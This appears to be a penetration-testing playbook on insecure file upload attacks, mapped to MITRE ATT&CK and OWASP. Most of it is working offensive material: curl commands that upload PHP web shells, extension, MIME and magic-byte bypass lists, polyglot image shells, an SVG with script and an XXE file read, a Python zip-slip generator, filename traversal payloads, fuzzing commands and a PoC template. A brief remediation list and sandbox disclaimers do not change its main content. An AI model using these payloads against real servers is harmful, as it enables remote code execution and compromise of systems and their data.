# Insecure File Upload — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)
**OWASP Mapping:** A03:2021 – Injection / A08:2021 – Software and Data Integrity Failures
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: file-upload-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A03:2021-Injection
  - A08:2021-SoftwareAndDataIntegrityFailures
tags:
  - file-upload
  - webshell
  - polyglot
  - svg
  - xxe
  - zip-slip
  - T1190
  - T1059
environments:
  - web
  - php
  - java
  - node
  - iis
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Upload Endpoints

- User avatar / profile picture
- Document / invoice / attachment upload
- Import CSV/XLS/JSON
- Image editors and crop tools (POST raw bytes)
- CMS media libraries, file managers
- Cloud storage presigned-URL uploads (`/upload`, `/api/upload`)

### 1.2 Validation Layers to Probe

1. Client-side validation (JS `accept` attribute, front-end checks) — trivially bypassed
2. Content-Type / MIME check (server-side but spoofable)
3. Extension blacklist / allow-list
4. Magic-byte (file signature) check
5. Content inspection (header sniffing, resize)
6. Storage location (web root vs outside, random vs predictable name)

---

## 2. Confirmation

### 2.1 Basic Upload Test

```bash
curl -s -X POST -b "session=AAA" \
  -F "file=@webshell.php;type=image/png" \
  -F "submit=Upload" \
  "https://target.com/upload"
# If a .php file is stored and reachable -> confirmed
```

### 2.2 Reachability Test

```bash
# Determine storage path from response or error message, then:
curl -s "https://target.com/uploads/webshell.php"
# PHP source execution vs raw output distinguishes interpreter from static serving
```

---

## 3. Exploitation

### 3.1 Extension Bypass

**Alternate PHP extensions:**
```
.php .php2 .php3 .php4 .php5 .php6 .php7 .phtml .phar .pht .php5.2 .pht .pgif .phtml7
```

**Double extension:**
```
shell.php.jpg    (Apache < 2.4.10, IIS 6.0, old nginx misconfig)
shell.php%00.png (null byte, legacy PHP < 5.3.4)
shell.pHp
shell.php5.jpg
```

**Case manipulation:**
```
shell.pHp shell.PHP shell.Php
```

**IIS-specific:**
```
shell.asp;.jpg shell.asp.jpg shell.asa shell.cer
```

**Trailing dot / space (Windows):**
```
shell.php. shell.php. .shell.php
```

### 3.2 `.htaccess` Attack (Apache)

Upload a `.htaccess` to reinterpret images as PHP:
```apache
AddType application/x-httpd-php .jpg
```
Then upload `shell.jpg` containing PHP code and access `shell.jpg`.

Nginx equivalent via `nginx.conf` upload is rare; test `autoindex` misconfiguration instead.

### 3.3 MIME / Content-Type Bypass

```bash
# Change declared MIME type
curl -s -X POST -F "file=@shell.php;type=image/gif" "https://target.com/upload"

# Send image/png but with .php extension
curl -s -X POST -H "Content-Type: image/png" --data-binary @shell.php "https://target.com/upload"
```

### 3.4 Magic-Bytes (Polyglot) Bypass

Prep a GIF/JPEG/PNG header so the file passes signature checks while still executing:
```bash
# GIF89a + PHP
printf 'GIF89a\n<?php system($_GET["c"]); ?>' > shell.gif
cp shell.gif shell.php.gif   # if extension allow-list permits .gif + AddHandler

# JPEG + PHP
printf '\xFF\xD8\xFF\xE0<?php system($_GET["c"]); ?>' > shell.jpg
```

### 3.5 SVG Stored XSS / XXE

SVG files are served in the same origin and processed by the browser:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <script>alert(document.domain)</script>
  <text x="10" y="20">&xxe;</text>
</svg>
```

### 3.6 Zip Slip (Path Traversal on Extraction)

```bash
# Create malicious zip with ../ traversal entries
python3 - <<'EOF'
import zipfile
z = zipfile.ZipFile('/tmp/evil.zip','w')
z.writestr('../../../../var/www/html/shell.php','<?php system($_GET["c"]); ?>')
z.close()
EOF
# Upload evil.zip; server extraction writes outside the target directory
```

### 3.7 Filename Path Traversal

```bash
curl -s -X POST -F 'file=@shell.php;filename=../../../../var/www/html/shell.php' \
  "https://target.com/upload"
```

### 3.8 WebShell Deployment

Minimal PHP shell (sandbox use only):
```php
<?php system($_GET['c']);
```
Access pattern: `https://target.com/uploads/shell.php?c=id`

---

## 4. Tool-Specific Guidance

### 4.1 Burp Suite

1. Intercept the upload request
2. Send to Intruder; attack the `filename=` value with the extension list (section 3.1)
3. Grep responses for success markers / returned URLs
4. Use "Engagement tools -> Search" to locate the uploaded file on the site

### 4.2 ffuf for extension fuzzing

```bash
ffuf -u "https://target.com/upload" -X POST \
  -d "submit=1" -H "Content-Type: multipart/form-data" \
  -F "file=@shell;filename=shellFUZZ" \
  -w <(printf '.php\n.php5\n.phtml\n.php%00.jpg\n.php.jpg\n') -mc 200
```

### 4.3 Nuclei file-upload templates

```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/vulnerabilities/file-upload/ -jsonl fu.jsonl
```

### 4.4 ImageMagick / polyglot generation

```bash
# Generate image+payload polyglot
cp base.png shell.php.png
exiftool -Comment='<?php system($_GET["c"]); ?>' shell.php.png
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Insecure File Upload — [FINDING_ID]

**URL:** https://target.com/upload
**Validation bypassed:** extension / MIME / magic bytes / client-side only
**Storage path:** /uploads/
**Outcome:** WebShell / Stored XSS / XXE / Zip Slip

### Payload
```
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/png
<?php system($_GET['c']); ?>
```

### Evidence
```
HTTP/1.1 200 OK
/uploads/shell.phtml?c=id -> uid=33(www-data) gid=33(www-data)
```

### Impact
- RCE: YES/NO
- Stored XSS: YES/NO
- Arbitrary file write (zip slip): YES/NO

### Remediation
- Store uploads outside the web root; serve via allow-listed handler
- Validate extension against an allow-list and rename the file
- Reject/repurpose images via real image re-encoding
- Disable execution in the upload directory (no `AddHandler`, no `.htaccess`)

### Reproduction Steps
1. Upload `shell.phtml` as `image/png`
2. Access `/uploads/shell.phtml?c=id`
3. Observe command output
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Shell executed only inside disposable sandbox container
- [ ] Polyglot verified to remain a valid image and execute code
- [ ] Zip slip extraction verified against a sacrificial web root
- [ ] Uploaded artifacts removed after test
- [ ] No file written outside the intended target tree in production

---

## 7. Cheat Sheet/Reference

| Bypass | Payload / Method |
|---|---|
| Extension | `.php .php5 .phtml .phar .pht .php7` |
| Double ext | `shell.php.jpg` |
| Case | `shell.PHP` |
| Null byte | `shell.php%00.jpg` |
| `.htaccess` | `AddType application/x-httpd-php .jpg` |
| MIME | `filename=shell.php;type=image/gif` |
| Polyglot | `GIF89a<?php ...?>` |
| SVG XSS/XXE | embedded `<script>` / `<!ENTITY>` |
| Zip slip | `../../` entry names in ZIP |
| Traversal name | `filename=../../etc/shell.php` |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1059 | Command and Scripting Interpreter | WebShell RCE |
| T1505.003 | Server Software Component: Web Shell | Persistence |
| T1204.002 | User Execution: Malicious File | Lure/malware upload |
| T1105 | Ingress Tool Transfer | Shell download |
| T1213 | Data from Information Repositories | Exfiltration |

---

## 9. References

- PayloadsAllTheThings Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- HackTricks File Upload: https://book.hacktricks.xyz/pentesting-web/file-upload
- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger File Upload: https://portswigger.net/web-security/file-upload

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
